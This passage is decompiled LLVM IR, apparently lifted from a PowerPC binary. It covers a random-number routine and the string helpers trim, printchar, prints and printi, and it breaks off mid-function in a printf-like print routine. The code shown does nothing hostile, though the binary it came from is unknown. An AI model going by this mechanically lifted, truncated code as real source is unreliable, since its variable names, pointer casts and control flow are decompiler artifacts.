  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_10000348 = load i32, i32* @global_var_100246a8.13, align 4
  %v1_1000034c = add i32 %v3_10000348, 1
  %v1_10000350 = urem i32 %v1_1000034c, 4096
  store i32 %v1_10000350, i32* @global_var_100246a8.13, align 4
  %v1_1000036c = mul nuw nsw i32 %v1_10000350, 4
  %v2_10000370 = add i32 %v1_1000036c, ptrtoint (i32* @global_var_10024ac0.10 to i32)
  %v1_10000374 = inttoptr i32 %v2_10000370 to i32*
  %v2_10000374 = load i32, i32* %v1_10000374, align 4
  %v6_10000398 = udiv i32 %v2_10000374, 228675
  %v2_1000039c = mul i32 %v2_10000374, 18782
  %v3_100003ac = load i32, i32* @global_var_100246a4.14, align 4
  %v2_100003b8 = add i32 %v3_100003ac, %v2_1000039c
  %v3_100003b8 = icmp ult i32 %v2_100003b8, %v3_100003ac
  %v4_100003bc = zext i1 %v3_100003b8 to i32
  %v5_100003bc = add nuw nsw i32 %v4_100003bc, %v6_10000398
  store i32 %v5_100003bc, i32* %r10.global-to-local, align 4
  %v2_100003ec = add i32 %v5_100003bc, %v2_100003b8
  %v2_10000400 = icmp ult i32 %v2_100003ec, %v5_100003bc
  br i1 %v2_10000400, label %dec_label_pc_10000408, label %dec_label_pc_10000428

dec_label_pc_10000408:                            ; preds = %entry
  %v1_1000040c = add i32 %v2_100003ec, 1
  %v1_1000041c = add nuw nsw i32 %v5_100003bc, 1
  br label %dec_label_pc_10000428

dec_label_pc_10000428:                            ; preds = %entry, %dec_label_pc_10000408
  %storemerge = phi i32 [ %v1_1000041c, %dec_label_pc_10000408 ], [ %v5_100003bc, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_1000040c, %dec_label_pc_10000408 ], [ %v2_100003ec, %entry ]
  store i32 %storemerge, i32* @global_var_100246a4.14, align 4
  store i32 %v1_10000350, i32* %r10.global-to-local, align 4
  %v2_10000438 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10000438, i32* %v1_10000374, align 4
  %v0_10000458 = load i32, i32* %r10.global-to-local, align 4
  %v1_10000458 = mul i32 %v0_10000458, 4
  %v2_1000045c = add i32 %v1_10000458, ptrtoint (i32* @global_var_10024ac0.10 to i32)
  %v1_10000460 = inttoptr i32 %v2_1000045c to i32*
  %v2_10000460 = load i32, i32* %v1_10000460, align 4
  ret i32 %v2_10000460

; uselistorder directives
  uselistorder i32 %v5_100003bc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_100003ac, { 1, 0 }
  uselistorder i32 %v2_10000374, { 1, 0 }
  uselistorder i32 %v1_10000350, { 2, 0, 1 }
  uselistorder i32* @global_var_10024ac0.10, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10024ac0.10 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10000428, { 1, 0 }
}

define i32 @trim(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000049c = call i32 @__GI_strlen()
  store i32 %v0_1000049c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100004c0

dec_label_pc_100004b4:                            ; preds = %dec_label_pc_100004c0
  %v1_100004b8 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_100004c0

dec_label_pc_100004c0:                            ; preds = %entry, %dec_label_pc_100004b4
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_100004b8, %dec_label_pc_100004b4 ]
  %v2_100004cc = add i32 %stack_var_-36.0, %arg1
  %v3_100004cc = inttoptr i32 %v2_100004cc to i8*
  %v3_100004d0 = load i8, i8* %v3_100004cc, align 1
  %v4_100004d0 = zext i8 %v3_100004d0 to i32
  store i32 %v4_100004d0, i32* %r3.global-to-local, align 4
  %v3_100004e0 = call i32 @isspace(i32 %v4_100004d0, i32 %v2_100004cc)
  store i32 %v3_100004e0, i32* %r3.global-to-local, align 4
  %v3_100004e8 = icmp eq i32 %v3_100004e0, 0
  br i1 %v3_100004e8, label %dec_label_pc_10000500.preheader, label %dec_label_pc_100004b4

dec_label_pc_10000500.preheader:                  ; preds = %dec_label_pc_100004c0
  %v1_100004a8 = add i32 %v0_1000049c, -1
  %v2_100005087 = icmp slt i32 %v1_100004a8, %stack_var_-36.0
  br i1 %v2_100005087, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_100004f4:                            ; preds = %dec_label_pc_10000510
  %v1_100004f8 = add i32 %stack_var_-40.010, -1
  %v2_10000508 = icmp slt i32 %v1_100004f8, %stack_var_-36.0
  br i1 %v2_10000508, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_10000510:                            ; preds = %dec_label_pc_10000500.preheader, %dec_label_pc_100004f4
  %stack_var_-40.010 = phi i32 [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %v1_100004a8, %dec_label_pc_10000500.preheader ]
  %v2_1000051c = add i32 %stack_var_-40.010, %arg1
  %v3_1000051c = inttoptr i32 %v2_1000051c to i8*
  %v3_10000520 = load i8, i8* %v3_1000051c, align 1
  %v4_10000520 = zext i8 %v3_10000520 to i32
  store i32 %v4_10000520, i32* %r3.global-to-local, align 4
  %v3_10000530 = call i32 @isspace(i32 %v4_10000520, i32 %v2_1000051c)
  store i32 %v3_10000530, i32* %r3.global-to-local, align 4
  %v3_10000538 = icmp eq i32 %v3_10000530, 0
  br i1 %v3_10000538, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_100004f4

dec_label_pc_1000058c.preheader:                  ; preds = %dec_label_pc_100004f4, %dec_label_pc_10000510, %dec_label_pc_10000500.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_100004a8, %dec_label_pc_10000500.preheader ], [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %stack_var_-40.010, %dec_label_pc_10000510 ]
  %v3_100005943 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_100005943, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000054c:                            ; preds = %dec_label_pc_1000058c.preheader, %dec_label_pc_1000054c
  %v2_100005b06 = phi i32 [ %v2_100005b0, %dec_label_pc_1000054c ], [ %arg1, %dec_label_pc_1000058c.preheader ]
  %storemerge15 = phi i32 [ %v1_10000584, %dec_label_pc_1000054c ], [ %stack_var_-36.0, %dec_label_pc_1000058c.preheader ]
  %v2_10000570 = add i32 %storemerge15, %arg1
  %v1_10000574 = inttoptr i32 %v2_10000570 to i8*
  %v2_10000574 = load i8, i8* %v1_10000574, align 1
  %v3_1000057c = inttoptr i32 %v2_100005b06 to i8*
  store i8 %v2_10000574, i8* %v3_1000057c, align 1
  %v1_10000584 = add i32 %storemerge15, 1
  %v3_10000594 = icmp sgt i32 %v1_10000584, %stack_var_-40.0.lcssa
  %v2_100005a4 = sub i32 %v1_10000584, %stack_var_-36.0
  %v2_100005b0 = add i32 %v2_100005a4, %arg1
  br i1 %v3_10000594, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000059c:                            ; preds = %dec_label_pc_1000054c, %dec_label_pc_1000058c.preheader
  %v2_100005b0.lcssa = phi i32 [ %arg1, %dec_label_pc_1000058c.preheader ], [ %v2_100005b0, %dec_label_pc_1000054c ]
  %v3_100005b8 = inttoptr i32 %v2_100005b0.lcssa to i8*
  store i8 0, i8* %v3_100005b8, align 1
  %v0_100005d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100005d0

; uselistorder directives
  uselistorder i32 %v1_10000584, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100004a8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 6, 1, 5, 2, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_1000054c, { 1, 0 }
  uselistorder label %dec_label_pc_1000058c.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000510, { 1, 0 }
  uselistorder label %dec_label_pc_100004c0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100005e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_100005f4 = icmp eq i32 %v0_100005e8, 0
  br i1 %v3_100005f4, label %dec_label_pc_10000628, label %dec_label_pc_100005fc

dec_label_pc_100005fc:                            ; preds = %entry
  %v1_10000600 = inttoptr i32 %v0_100005e8 to i32*
  %v2_10000600 = load i32, i32* %v1_10000600, align 4
  %v1_1000060c = trunc i32 %arg2 to i8
  %v3_1000060c = inttoptr i32 %v2_10000600 to i8*
  store i8 %v1_1000060c, i8* %v3_1000060c, align 1
  %v2_10000614 = load i32, i32* %v1_10000600, align 4
  %v1_10000618 = add i32 %v2_10000614, 1
  store i32 %v1_10000618, i32* %v1_10000600, align 4
  %v0_10000650.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_10000628:                            ; preds = %entry
  %v2_10000628 = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268437052, i32* @lr, align 4
  %v2_10000638 = call i32 @__libc_write(i32 1, i32 %v2_10000628)
  store i32 %v2_10000638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_1000063c:                            ; preds = %dec_label_pc_100005fc, %dec_label_pc_10000628
  %v0_10000650 = phi i32 [ %v0_10000650.pre, %dec_label_pc_100005fc ], [ %v2_10000638, %dec_label_pc_10000628 ]
  ret i32 %v0_10000650

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000063c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp45 = icmp slt i32 %arg3, 1
  br i1 %tmp45, label %dec_label_pc_10000718, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %entry
  %v2_100006c426 = load i8, i8* %arg2, align 1
  %v3_100006cc29 = icmp eq i8 %v2_100006c426, 0
  br i1 %v3_100006cc29, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006a8:                            ; preds = %dec_label_pc_10000694, %dec_label_pc_100006a8
  %v4_100006c031 = phi i32 [ %v1_100006b8, %dec_label_pc_100006a8 ], [ %tmp, %dec_label_pc_10000694 ]
  %stack_var_-20.030 = phi i32 [ %v1_100006ac, %dec_label_pc_100006a8 ], [ 0, %dec_label_pc_10000694 ]
  %v1_100006ac = add i32 %stack_var_-20.030, 1
  %v1_100006b8 = add i32 %v4_100006c031, 1
  %v5_100006bc = inttoptr i32 %v1_100006b8 to i8*
  %v2_100006c4 = load i8, i8* %v5_100006bc, align 1
  %v3_100006cc = icmp eq i8 %v2_100006c4, 0
  br i1 %v3_100006cc, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006d4:                            ; preds = %dec_label_pc_100006a8, %dec_label_pc_10000694
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000694 ], [ %v1_100006ac, %dec_label_pc_100006a8 ]
  %v2_100006dc = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_100006dc, label %dec_label_pc_100006f0, label %dec_label_pc_10000700

dec_label_pc_100006f0:                            ; preds = %dec_label_pc_100006d4
  %v2_100006f8 = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000700

dec_label_pc_10000700:                            ; preds = %dec_label_pc_100006d4, %dec_label_pc_100006f0
  %storemerge3 = phi i32 [ %v2_100006f8, %dec_label_pc_100006f0 ], [ 0, %dec_label_pc_100006d4 ]
  %v1_10000704 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10000708 = icmp eq i32 %v1_10000704, 0
  br i1 %v3_10000708, label %dec_label_pc_10000718, label %dec_label_pc_10000710

dec_label_pc_10000710:                            ; preds = %dec_label_pc_10000700
  br label %dec_label_pc_10000718

dec_label_pc_10000718:                            ; preds = %dec_label_pc_10000700, %entry, %dec_label_pc_10000710
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_10000700 ], [ %storemerge3, %dec_label_pc_10000710 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10000700 ], [ 48, %dec_label_pc_10000710 ]
  %v1_1000071c = urem i32 %arg4, 2
  %v3_10000720 = icmp eq i32 %v1_1000071c, 0
  br i1 %v3_10000720, label %dec_label_pc_10000750.preheader, label %dec_label_pc_10000790.preheader

dec_label_pc_10000750.preheader:                  ; preds = %dec_label_pc_10000718
  %v2_1000075419 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_1000075419, label %dec_label_pc_1000072c.lr.ph, label %dec_label_pc_10000790.preheader

dec_label_pc_1000072c.lr.ph:                      ; preds = %dec_label_pc_10000750.preheader
  %v2_10000734 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_1000072c

dec_label_pc_1000072c:                            ; preds = %dec_label_pc_1000072c.lr.ph, %dec_label_pc_1000072c
  %stack_var_-32.122 = phi i32 [ %stack_var_-32.0, %dec_label_pc_1000072c.lr.ph ], [ %v1_10000748, %dec_label_pc_1000072c ]
  %v3_10000734 = call i32 @printchar(i32* %v2_10000734, i32 %stack_var_-16.0)
  %v1_10000748 = add nsw i32 %stack_var_-32.122, -1
  %v2_10000754 = icmp sgt i32 %stack_var_-32.122, 1
  br i1 %v2_10000754, label %dec_label_pc_1000072c, label %dec_label_pc_10000790.preheader

dec_label_pc_10000790.preheader:                  ; preds = %dec_label_pc_1000072c, %dec_label_pc_10000750.preheader, %dec_label_pc_10000718
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10000718 ], [ 0, %dec_label_pc_10000750.preheader ], [ %stack_var_-32.0, %dec_label_pc_1000072c ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000718 ], [ %stack_var_-32.0, %dec_label_pc_10000750.preheader ], [ 0, %dec_label_pc_1000072c ]
  %v2_1000079410 = load i8, i8* %arg2, align 1
  %v3_1000079c13 = icmp eq i8 %v2_1000079410, 0
  br i1 %v3_1000079c13, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760.lr.ph

dec_label_pc_10000760.lr.ph:                      ; preds = %dec_label_pc_10000790.preheader
  %v2_10000774 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000760

dec_label_pc_10000760:                            ; preds = %dec_label_pc_10000760.lr.ph, %dec_label_pc_10000760
  %v4_1000079016 = phi i32 [ %tmp, %dec_label_pc_10000760.lr.ph ], [ %v1_10000788, %dec_label_pc_10000760 ]
  %stack_var_-36.015 = phi i8* [ %arg2, %dec_label_pc_10000760.lr.ph ], [ %v5_1000078c, %dec_label_pc_10000760 ]
  %stack_var_-12.114 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000760.lr.ph ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_10000764 = load i8, i8* %stack_var_-36.015, align 1
  %v3_10000764 = zext i8 %v2_10000764 to i32
  %v3_10000774 = call i32 @printchar(i32* %v2_10000774, i32 %v3_10000764)
  %v1_1000077c = add i32 %stack_var_-12.114, 1
  %v1_10000788 = add i32 %v4_1000079016, 1
  %v5_1000078c = inttoptr i32 %v1_10000788 to i8*
  %v2_10000794 = load i8, i8* %v5_1000078c, align 1
  %v3_1000079c = icmp eq i8 %v2_10000794, 0
  br i1 %v3_1000079c, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760

dec_label_pc_100007cc.preheader:                  ; preds = %dec_label_pc_10000760, %dec_label_pc_10000790.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000790.preheader ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_100007d05 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_100007d05, label %dec_label_pc_100007a8.lr.ph, label %dec_label_pc_100007d8

dec_label_pc_100007a8.lr.ph:                      ; preds = %dec_label_pc_100007cc.preheader
  %v2_100007b0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_100007a8

dec_label_pc_100007a8:                            ; preds = %dec_label_pc_100007a8.lr.ph, %dec_label_pc_100007a8
  %stack_var_-32.38 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_100007a8.lr.ph ], [ %v1_100007c4, %dec_label_pc_100007a8 ]
  %v3_100007b0 = call i32 @printchar(i32* %v2_100007b0, i32 %stack_var_-16.0)
  %v1_100007c4 = add nsw i32 %stack_var_-32.38, -1
  %v2_100007d0 = icmp sgt i32 %stack_var_-32.38, 1
  br i1 %v2_100007d0, label %dec_label_pc_100007a8, label %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge

dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge: ; preds = %dec_label_pc_100007a8
  %tmp46 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_100007d8

dec_label_pc_100007d8:                            ; preds = %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge, %dec_label_pc_100007cc.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp46, %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_100007cc.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000788, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100006b8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100007a8, { 1, 0 }
  uselistorder label %dec_label_pc_10000760, { 1, 0 }
  uselistorder label %dec_label_pc_1000072c, { 1, 0 }
  uselistorder label %dec_label_pc_10000718, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000700, { 1, 0 }
  uselistorder label %dec_label_pc_100006a8, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10000844 = icmp eq i32 %arg2, 0
  br i1 %v3_10000844, label %dec_label_pc_1000084c, label %dec_label_pc_10000880

dec_label_pc_1000084c:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10000870 = bitcast i32* %stack_var_-88 to i8*
  %v5_10000870 = call i32 @prints(i32 %arg1, i8* %v4_10000870, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_100009d8

dec_label_pc_10000880:                            ; preds = %entry
  %v3_10000884 = icmp eq i32 %arg4, 0
  br i1 %v3_10000884, label %dec_label_pc_100008b8, label %dec_label_pc_1000088c

dec_label_pc_1000088c:                            ; preds = %dec_label_pc_10000880
  %v3_10000890 = icmp eq i32 %arg3, 10
  br i1 %v3_10000890, label %dec_label_pc_10000898, label %dec_label_pc_100008b8

dec_label_pc_10000898:                            ; preds = %dec_label_pc_1000088c
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_100008b8, label %dec_label_pc_100008a4

dec_label_pc_100008a4:                            ; preds = %dec_label_pc_10000898
  %v1_100008b0 = sub i32 0, %arg2
  br label %dec_label_pc_100008b8

dec_label_pc_100008b8:                            ; preds = %dec_label_pc_1000088c, %dec_label_pc_10000898, %dec_label_pc_10000880, %dec_label_pc_100008a4
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000880 ], [ %arg2, %dec_label_pc_10000898 ], [ %v1_100008b0, %dec_label_pc_100008a4 ], [ %arg2, %dec_label_pc_1000088c ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000880 ], [ 0, %dec_label_pc_10000898 ], [ 1, %dec_label_pc_100008a4 ], [ 0, %dec_label_pc_1000088c ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_100009445 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_100009445, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0.lr.ph

dec_label_pc_100008d0.lr.ph:                      ; preds = %dec_label_pc_100008b8
  %v2_10000900 = add i32 %arg7, -58
  br label %dec_label_pc_100008d0

dec_label_pc_100008d0:                            ; preds = %dec_label_pc_100008d0.lr.ph, %dec_label_pc_1000090c
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_100008d0.lr.ph ], [ %v2_10000938, %dec_label_pc_1000090c ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_100008d0.lr.ph ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v2_100008d8 = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_100008d8, 10
  br i1 %tmp29, label %dec_label_pc_1000090c, label %dec_label_pc_100008f8

dec_label_pc_100008f8:                            ; preds = %dec_label_pc_100008d0
  %v1_10000904 = add i32 %v2_10000900, %v2_100008d8
  br label %dec_label_pc_1000090c

dec_label_pc_1000090c:                            ; preds = %dec_label_pc_100008d0, %dec_label_pc_100008f8
  %stack_var_-32.0 = phi i32 [ %v2_100008d8, %dec_label_pc_100008d0 ], [ %v1_10000904, %dec_label_pc_100008f8 ]
  %v4_1000090c = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000910 = add i32 %v4_1000090c, -1
  %v5_10000914 = inttoptr i32 %v1_10000910 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_1000092c = trunc i32 %fold to i8
  store i8 %v1_1000092c, i8* %v5_10000914, align 1
  %v2_10000938 = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000944 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000944, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0

dec_label_pc_1000094c:                            ; preds = %dec_label_pc_1000090c, %dec_label_pc_100008b8
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_100008b8 ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v3_10000950 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000950, label %dec_label_pc_100009b4, label %dec_label_pc_10000958

dec_label_pc_10000958:                            ; preds = %dec_label_pc_1000094c
  %v3_1000095c = icmp eq i32 %arg5, 0
  br i1 %v3_1000095c, label %dec_label_pc_1000099c, label %dec_label_pc_10000964

dec_label_pc_10000964:                            ; preds = %dec_label_pc_10000958
  %v1_10000968 = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_1000096c = icmp eq i32 %v1_10000968, 0
  br i1 %v3_1000096c, label %dec_label_pc_1000099c, label %dec_label_pc_10000974

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000964
  %v2_1000097c = inttoptr i32 %arg1 to i32*
  %v3_1000097c = call i32 @printchar(i32* %v2_1000097c, i32 45)
  %v1_10000990 = add i32 %arg5, -1
  br label %dec_label_pc_100009b4

dec_label_pc_1000099c:                            ; preds = %dec_label_pc_10000964, %dec_label_pc_10000958
  %v4_1000099c = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_100009a0 = add i32 %v4_1000099c, -1
  %v5_100009a4 = inttoptr i32 %v1_100009a0 to i8*
  store i8 45, i8* %v5_100009a4, align 1
  br label %dec_label_pc_100009b4

dec_label_pc_100009b4:                            ; preds = %dec_label_pc_1000094c, %dec_label_pc_10000974, %dec_label_pc_1000099c
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_1000094c ], [ %v5_100009a4, %dec_label_pc_1000099c ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000974 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_1000094c ], [ %arg5, %dec_label_pc_1000099c ], [ %v1_10000990, %dec_label_pc_10000974 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_1000094c ], [ 0, %dec_label_pc_1000099c ], [ 1, %dec_label_pc_10000974 ]
  %v5_100009c4 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_100009d0 = add i32 %v5_100009c4, %stack_var_-40.0
  br label %dec_label_pc_100009d8

dec_label_pc_100009d8:                            ; preds = %dec_label_pc_1000084c, %dec_label_pc_100009b4
  %storemerge = phi i32 [ %v2_100009d0, %dec_label_pc_100009b4 ], [ %v5_10000870, %dec_label_pc_1000084c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000914, { 0, 2, 1 }
  uselistorder i32 %v2_100008d8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100009d8, { 1, 0 }
  uselistorder label %dec_label_pc_100009b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000090c, { 1, 0 }
  uselistorder label %dec_label_pc_100008d0, { 1, 0 }
  uselistorder label %dec_label_pc_100008b8, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_10000fc828 = load i8, i8* %stack_var_-68.427, align 1
  %v3_10000fd031 = icmp eq i8 %v2_10000fc828, 0
  br i1 %v3_10000fd031, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24.lr.ph

dec_label_pc_10000a24.lr.ph:                      ; preds = %entry
  %v1_10000b98 = add i32 %arg3, 4
  %v2_10000b98 = inttoptr i32 %v1_10000b98 to i32*
  %v1_10000b60 = add i32 %arg3, 8
  %v2_10000b60 = inttoptr i32 %v1_10000b60 to i32*
  %v4_10000f7c = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10000a24

dec_label_pc_10000a24:                            ; preds = %dec_label_pc_10000a24.lr.ph, %dec_label_pc_10000fb8
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_10000fb8 ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10000a24.lr.ph ], [ %v1_10000fbc, %dec_label_pc_10000fb8 ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v2_10000a28 = load i8, i8* %stack_var_-68.434, align 1
  %v3_10000a30 = icmp eq i8 %v2_10000a28, 37
  br i1 %v3_10000a30, label %dec_label_pc_10000a38, label %dec_label_pc_10000f94

dec_label_pc_10000a38:                            ; preds = %dec_label_pc_10000a24
  %v1_10000a3c = add i32 %stack_var_-68.4.in33, 1
  %v5_10000a40 = inttoptr i32 %v1_10000a3c to i8*
  %v2_10000a58 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a60 = icmp eq i8 %v2_10000a58, 0
  br i1 %v3_10000a60, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a68

dec_label_pc_10000a68:                            ; preds = %dec_label_pc_10000a38
  %v2_10000a6c = load i8, i8* %v5_10000a40, align 1
  %v3_10000a74 = icmp eq i8 %v2_10000a6c, 37
  br i1 %v3_10000a74, label %dec_label_pc_10000f94, label %dec_label_pc_10000a7c

dec_label_pc_10000a7c:                            ; preds = %dec_label_pc_10000a68
  %v2_10000a80 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a88 = icmp eq i8 %v2_10000a80, 45
  br i1 %v3_10000a88, label %dec_label_pc_10000a90, label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000a90:                            ; preds = %dec_label_pc_10000a7c
  %v1_10000a94 = add i32 %stack_var_-68.4.in33, 2
  %v5_10000a98 = inttoptr i32 %v1_10000a94 to i8*
  br label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000ac0.preheader:                  ; preds = %dec_label_pc_10000a90, %dec_label_pc_10000a7c
  %stack_var_-68.0.ph = phi i8* [ %v5_10000a40, %dec_label_pc_10000a7c ], [ %v5_10000a98, %dec_label_pc_10000a90 ]
